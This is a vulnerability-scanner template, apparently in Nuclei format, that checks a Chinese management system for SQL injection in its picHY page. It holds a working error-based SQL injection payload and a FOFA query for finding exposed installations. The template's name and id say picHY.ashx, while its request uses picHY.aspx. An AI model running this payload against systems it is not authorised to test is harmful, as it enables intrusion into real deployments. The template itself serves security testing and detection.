id: poc-yaml-jiu-jia-yi-ms-pichy-ashx-sqli
info:
  name: 九佳易管理系统 picHY.ashx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: 九佳易管理系统
    fofa: title="VSQL" && body="/Scripts/Login_A8/"

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        GET /HuiYuan/HuiYuanDangAn/picHY.aspx?hyh=1'+AND+1234+IN+(SELECT+(sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))))-- HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: dsl
        dsl:
          - contains(body, concat("0x", t2))
          - contains(body, "SqlException:")
          - contains(body, ".picHY")
          - regex(body, "转换成数据类型(.*?)时失败")
          - regex(body, "在将(.*?)值")
